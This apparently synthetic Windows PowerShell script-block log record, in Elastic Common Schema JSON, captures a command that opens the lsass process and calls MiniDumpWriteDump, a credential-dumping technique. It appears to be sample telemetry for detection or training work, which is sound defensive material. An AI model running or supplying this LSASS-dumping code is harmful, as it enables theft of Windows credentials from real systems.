{
    "@timestamp": "2025-09-22T10:02:00.000Z",
    "event": {
        "category": [
            "process"
        ],
        "type": [
            "info"
        ],
        "kind": "event",
        "action": "script-block-log",
        "dataset": "windows.powershell_operational"
    },
    "host": {
        "name": "DESKTOP-SALES042",
        "hostname": "DESKTOP-SALES042",
        "id": "a7b8c9d0-1234-5678-90ab-cdef12345678",
        "os": {
            "type": "windows",
            "platform": "windows",
            "family": "windows"
        }
    },
    "powershell": {
        "file": {
            "script_block_text": "$ProcessHandle = [System.Diagnostics.Process]::GetProcessesByName('lsass')[0].Handle; $Callback = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress dbghelp.dll MiniDumpWriteDump), (Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr]))); $Callback.Invoke($ProcessHandle, [System.Diagnostics.Process]::GetCurrentProcess().Id, $FileStream.Handle, 0x00000002, [IntPtr]::Zero)",
            "script_block_id": "a767e8c9-1d2e-3f4a-5b6c-7d8e9f0a1b2c"
        }
    },
    "winlog": {
        "channel": "Microsoft-Windows-PowerShell/Operational",
        "event_id": "4104",
        "provider_name": "Microsoft-Windows-PowerShell"
    },
    "process": {
        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "pid": 8901
    },
    "user": {
        "name": "jsmith",
        "domain": "SALES",
        "id": "S-1-5-21-123456789-1234567890-123456789-1001"
    },
    "data_stream": {
        "dataset": "windows.powershell_operational",
        "namespace": "default",
        "type": "logs"
    },
    "ecs": {
        "version": "8.0.0"
    }
}